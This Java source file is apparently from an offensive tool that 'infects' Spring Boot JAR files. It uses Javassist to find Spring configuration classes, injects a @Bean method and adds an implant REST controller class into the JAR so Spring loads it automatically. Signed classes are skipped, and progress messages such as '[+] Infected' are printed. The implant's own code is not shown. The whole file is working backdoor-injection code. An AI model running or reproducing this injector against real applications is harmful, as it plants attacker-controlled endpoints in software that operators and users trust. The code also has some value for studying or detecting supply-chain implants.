package org.example.injector;

import javassist.bytecode.*;
import javassist.bytecode.annotation.Annotation;
import javassist.bytecode.annotation.MemberValue;
import org.example.implants.SpringImplantConfiguration;
import org.example.implants.SpringImplantController;

import java.io.DataInputStream;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.*;
import java.util.jar.JarEntry;

public class SpringInjector {
    public static void main(String[] args) {
        if (args.length < 2) {
            System.exit(1);
        }

        SpringInjector injector = new SpringInjector();
        try {
            Path targetPath = Path.of(args[0]);
            Path outputPath = Path.of(args[1]);
            System.out.println("[i] Target JAR: " + targetPath);
            System.out.println("[i] Output JAR: " + outputPath);
            if (!Files.exists(targetPath) && !Files.isRegularFile(targetPath)) {
                System.out.println("[!] Target JAR is not a regular existing file.");
                System.exit(1);
            }
            if (Files.exists(outputPath) && targetPath.toRealPath().equals(outputPath.toRealPath())) {
                System.out.println("[-] Target JAR and output JAR cannot be the same.");
                System.exit(1);
            }
            if (injector.infect(targetPath, outputPath)) {
                System.out.println("[+] Infected '" + targetPath + "'. Modified JAR available at: " + outputPath);
            } else {
                System.out.println("[-] Did not infect '" + targetPath + "'.");
            }
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    SpringInjector() {
    }

    public boolean infect(final Path targetJarFilePath, Path outputJar) throws IOException {
        boolean didInfect = false;
        boolean foundSignedClasses = false;
        try (JarFileFiddler fiddler = JarFileFiddler.open(targetJarFilePath, outputJar)) {
            for (JarFileFiddler.WrappedJarEntry entry : fiddler) {
                if (!entry.getName().endsWith(".class")) {
                    entry.passOn();
                    continue;
                }
                if (entry.getEntry().getCodeSigners() != null) {
                    foundSignedClasses = true;
                    entry.passOn();
                    continue;
                }

                ClassFile currentlyProcessingClassFile;
                try (DataInputStream in = new DataInputStream(entry.getContent())) {
                    currentlyProcessingClassFile = new ClassFile(in);
                    if (!isSpringConfigurationClass(currentlyProcessingClassFile)) {
                        entry.passOn();
                        continue;
                    }
                    System.out.println("[+] Found Spring configuration: " + entry.getName());

                    if (!hasComponentScanEnabled(currentlyProcessingClassFile)) {
                        System.out.println("[-] Spring configuration is not set to automatically scan for components (@ComponentScan).");

                        ClassFile implantSpringConfig = loadSpringImplantConfigClass();
                        if (!addSpringBeanToConfigClass(currentlyProcessingClassFile, implantSpringConfig)) {
                            System.out.println("[-] Class '" + currentlyProcessingClassFile.getName() + "' already infected. Skipping.");
                            continue;
                        }

                        currentlyProcessingClassFile.write(entry.addOnly());
                        System.out.println("[+] Injected @Bean method into '" + currentlyProcessingClassFile.getName() + "'.");
                    } else {
                        entry.passOn();
                    }

                    /*
                     * By adding our own Spring component (like a RestController) into the JAR under the same package
                     * as the Spring config class, Spring will happily load it automatically. This is assuming that
                     * @ComponentScan is used (included in the @SpringBootApplication annotation). If not, then this
                     * component needs to be explicitly referenced as a @Bean in the config class.
                     */
                    ClassFile implantClass = loadImplantClass();
                    String targetPackageName = parsePackageNameFromFqcn(currentlyProcessingClassFile.getName());
                    JarEntry newJarEntry = convertToJarEntry(implantClass, targetPackageName);
                    implantClass.write(fiddler.addNewEntry(newJarEntry));
                    System.out.println("[+] Wrote implant class '" + newJarEntry.getName() + "' to JAR file.");

                    didInfect = true;
                }
            }

            if (foundSignedClasses) {
                System.out.println("[-] Found signed classes. These were not considered for infection.");
            }
        }

        return didInfect;
    }

    private static String parsePackageNameFromFqcn(final String fqcn) {
        String[] parts = fqcn.split("\\.");
        if (parts.length < 2) {
            throw new RuntimeException("Not a fully qualified class name: " + fqcn);
        }
        String[] packageParts = Arrays.copyOfRange(parts, 0, parts.length - 1);
        return String.join(".", packageParts);
    }

    private static String parseClassNameFromFqcn(final String fqcn) {
        String[] parts = fqcn.split("\\.");
        if (parts.length < 2) {
            throw new RuntimeException("Not a fully qualified class name: " + fqcn);
        }
        return parts[parts.length - 1];
    }

    private static ClassFile loadImplantClass() throws IOException {
        try {
            // TODO Add class translation hashmap thing as param here
            return ImplantReader.findAndReadClassFile(SpringImplantController.class);
        } catch (ClassNotFoundException e) {
            throw new RuntimeException(e);
        }
    }

    private static ClassFile loadSpringImplantConfigClass() {
        try {
            return ImplantReader.findAndReadClassFile(SpringImplantConfiguration.class);
        } catch (ClassNotFoundException | IOException e) {
            throw new RuntimeException("Cannot load SpringImplantConfiguration class.", e);
        }
    }

    private static boolean addSpringBeanToConfigClass(ClassFile existingSpringConfig, final ClassFile implantSpringConfig) {
        final String beanMethodName = "getImplantController";
        MethodInfo existingImplantControllerBean = existingSpringConfig.getMethod(beanMethodName);
        if (existingImplantControllerBean != null) {
            return false;
        }

        try {
            String targetPackageDesc = parsePackageNameFromFqcn(existingSpringConfig.getName()).replace(".", "/");
            String implantPackageDesc = parsePackageNameFromFqcn(implantSpringConfig.getName()).replace(".", "/");
            String targetNameDesc = parseClassNameFromFqcn(existingSpringConfig.getName());
            String implantNameDesc = parseClassNameFromFqcn(implantSpringConfig.getName());
            // TODO Make a convertToClassFormatFqcn() to go from dot-notation to slash-notation

            Map<String, String> translateTable = new HashMap<>();
            // TODO Don't hardcode
            translateTable.put(implantPackageDesc + "/SpringImplantController", targetPackageDesc + "/SpringImplantController");
            translateTable.put(implantPackageDesc + "/" + implantNameDesc, targetPackageDesc + "/" + targetNameDesc);

            MethodInfo implantBeanMethod = implantSpringConfig.getMethod(beanMethodName);
            String implantBeanMethodDesc = implantBeanMethod.getDescriptor().replace(implantPackageDesc, targetPackageDesc);
            MethodInfo targetBeanMethod = new MethodInfo(existingSpringConfig.getConstPool(), implantBeanMethod.getName(), implantBeanMethodDesc);
            targetBeanMethod.getAttributes().removeIf(Objects::isNull); // Workaround for some internal bug in Javassist

            CodeAttribute codeAttr = (CodeAttribute) implantBeanMethod.getCodeAttribute().copy(existingSpringConfig.getConstPool(), translateTable);
            codeAttr.setMaxLocals(implantBeanMethod.getCodeAttribute().getMaxLocals());
            targetBeanMethod.setCodeAttribute(codeAttr);

            ExceptionsAttribute exceptions = (ExceptionsAttribute) implantBeanMethod.getExceptionsAttribute().copy(existingSpringConfig.getConstPool(), translateTable);
            targetBeanMethod.setExceptionsAttribute(exceptions);

            copyAllMethodAnnotations(targetBeanMethod, implantBeanMethod);

            existingSpringConfig.addMethod(targetBeanMethod);
        } catch (DuplicateMemberException e) {
            throw new RuntimeException(e);
        }

        return true;
    }

    // Copy all annotations from implant method to target method. Notice the const pools!
    private static void copyAllMethodAnnotations(MethodInfo target, final MethodInfo source) {
        AttributeInfo sourceAttr = source.getAttribute("RuntimeVisibleAnnotations");
        if (sourceAttr == null) {
            // The source method does not have any annotations. Is this fine?
            return;
        }
        if (!(sourceAttr instanceof AnnotationsAttribute sourceAnnotationsAttr)) {
            throw new RuntimeException("Failed to make sense of RuntimeVisibleAnnotations.");
        }

        AnnotationsAttribute targetAnnotationsAttr = new AnnotationsAttribute(target.getConstPool(), "RuntimeVisibleAnnotations");
        for (Annotation annotation : sourceAnnotationsAttr.getAnnotations()) {
            Annotation copiedAnnotation = new Annotation(annotation.getTypeName(), target.getConstPool());
            for (String memberValueName : annotation.getMemberNames()) {
                MemberValue memberValue = annotation.getMemberValue(memberValueName);
                copiedAnnotation.addMemberValue(memberValueName, memberValue);
            }
            targetAnnotationsAttr.addAnnotation(copiedAnnotation);
        }

        target.addAttribute(targetAnnotationsAttr);
    }

    private static JarEntry convertToJarEntry(final ClassFile classFile, final String targetPackageName) {
        String implantClassName = parseClassNameFromFqcn(classFile.getName());
        classFile.setName(targetPackageName + "." + implantClassName);
        // TODO Maybe this "BOOT-INF" etc is not a good thing to hardcode? Versioned JARs? Discrepancies in Spring JAR structure?
        String fullPathInsideJar = "BOOT-INF/classes/" + classFile.getName().replace(".", "/") + ".class";
        return new JarEntry(fullPathInsideJar);
    }

    private static boolean isSpringConfigurationClass(final ClassFile classFile) {
        List<Annotation> springAnnotations = classFile.getAttributes().stream()
                .filter(attribute -> attribute instanceof AnnotationsAttribute)
                .map(attribute -> (AnnotationsAttribute) attribute)
                .filter(annotationAttribute -> annotationAttribute.getName().equals("RuntimeVisibleAnnotations"))
                .flatMap(runtimeAnnotationAttribute -> Arrays.stream(runtimeAnnotationAttribute.getAnnotations())
                        .filter(SpringInjector::isAnySpringContextAnnotation)
                )
                .toList();
        return !springAnnotations.isEmpty();
    }

    private static boolean isAnySpringContextAnnotation(final Annotation annotation) {
        return switch (annotation.getTypeName()) {
            case "org.springframework.boot.autoconfigure.SpringBootApplication" -> true;
            case "org.springframework.context.annotation.Configuration" -> true;
            default -> false;
        };
    }

    private static boolean hasComponentScanEnabled(final ClassFile springContextClassFile) {
        List<Annotation> componentScanAnnotations = springContextClassFile.getAttributes().stream()
                .filter(attribute -> attribute instanceof AnnotationsAttribute)
                .map(attribute -> (AnnotationsAttribute) attribute)
                .filter(annotationAttribute -> annotationAttribute.getName().equals("RuntimeVisibleAnnotations"))
                .flatMap(runtimeAnnotationAttribute -> Arrays.stream(runtimeAnnotationAttribute.getAnnotations())
                        .filter(annotation -> annotation.getTypeName().equals("org.springframework.context.annotation.ComponentScan"))
                )
                .toList();
        return !componentScanAnnotations.isEmpty();
    }
}
